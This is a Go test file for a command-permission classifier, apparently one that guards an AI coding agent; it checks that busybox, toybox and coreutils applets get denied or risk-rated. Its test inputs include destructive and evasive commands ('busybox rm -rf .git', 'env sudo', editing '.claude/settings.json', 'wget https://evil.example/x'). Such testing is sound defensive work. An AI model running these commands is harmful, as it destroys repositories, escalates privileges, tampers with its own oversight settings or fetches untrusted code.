package classes_test

import (
	"testing"

	"github.com/lucasndas/mestre/internal/classes"
)

// A multi-call binary (busybox, toybox) runs the applet named by its first
// argument: the dispatcher analyses that command; without an applet it asks.
func TestMultiCallBinariesRunTheirApplet(t *testing.T) {
	t.Parallel()
	m := newMachine()
	env := m.env()
	free := rules(t, anyYAML)
	for cmd, reason := range map[string]string{
		"busybox rm -rf .git":                    ".git",
		"busybox sh -c 'git push'":               "git push",
		"toybox git push origin":                 "git push",
		"busybox env sudo ls":                    "sudo",
		"coreutils --coreutils-prog=rm -rf .git": ".git",
		"busybox touch .claude/settings.json":    ".claude/settings.json",
	} {
		want(t, decide(env, free, m.shell(cmd)), classes.Deny, classes.LayerFixed, reason)
	}
	// The applet is the program the class rules and the risk see.
	qa := rules(t, qaYAML)
	want(t, decide(env, qa, m.shell("busybox curl https://x.io")), classes.Deny, classes.LayerClass, "curl *")
	if r := shellRisk(env, free, "busybox wget https://evil.example/x"); r.Risk != classes.RiskMedium {
		t.Errorf("busybox wget = %s (%s); want medio", r.Risk, r.Rule)
	}
	def := rules(t, "version: 1\n")
	want(t, decide(env, def, m.shell("busybox ls")), classes.Allow, "")
	// No applet, or an option of the binary: at least ask, medio.
	for _, cmd := range []string{"busybox", "busybox --install -s /tmp/x", "toybox --long"} {
		d := decide(env, def, m.shell(cmd))
		want(t, d, classes.Ask, "")
		if d.Risk.Risk != classes.RiskMedium {
			t.Errorf("%q: risk %s (%s); want medio", cmd, d.Risk.Risk, d.Risk.Rule)
		}
	}
}
